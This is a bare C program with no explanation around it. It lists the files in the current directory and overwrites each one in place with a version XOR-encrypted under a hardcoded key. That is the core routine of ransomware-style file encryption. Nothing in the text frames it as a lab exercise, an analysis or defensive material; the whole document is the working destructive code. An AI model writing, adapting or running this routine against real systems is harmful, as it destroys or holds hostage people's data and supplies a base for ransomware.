#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

#define KEY_LENGTH 16

// Simple XOR encryption function
void encrypt_file(const char* filepath, unsigned char key[KEY_LENGTH]) {
    FILE *file;
    unsigned long fileLen;

    // Open the file in binary mode
    file = fopen(filepath, "rb");
    if (!file) {
        printf("Unable to open file %s\n", filepath);
        return;
    }

    // Get file length
    fseek(file, 0, SEEK_END);
    fileLen=ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory
    char *buffer=(char *)malloc((fileLen+1)*sizeof(char));
    if (!buffer) {
        fclose(file);
        printf("Memory error!");
        return;
    }

    // Read file into buffer
    fread(buffer, sizeof(char), fileLen, file);

    // Encrypt using XOR
    for(int i = 0; i < fileLen; i++) {
        buffer[i] ^= key[i % KEY_LENGTH];
    }

    // Write encrypted content back to file
    freopen(filepath, "wb+", file);
    fwrite(buffer, sizeof(char), fileLen, file);
    
    free(buffer);
    fclose(file);
}

int main() {
    DIR *dir;
    struct dirent *entry;
    char current_dir[1024];
    unsigned char key[KEY_LENGTH] = "simpleencryption";
    
    getcwd(current_dir, sizeof(current_dir));
    
    dir = opendir(".");
    if (dir == NULL) {
        perror("");
        exit(1);
    }
    
    while ((entry = readdir(dir)) != NULL) {
        // Skip directories and itself
        if(entry->d_name[0] == '.' || entry->d_type == DT_DIR) continue;
        
        // Encrypt each file
        encrypt_file(entry->d_name, key);
    }
    
    closedir(dir);
    return 0;
}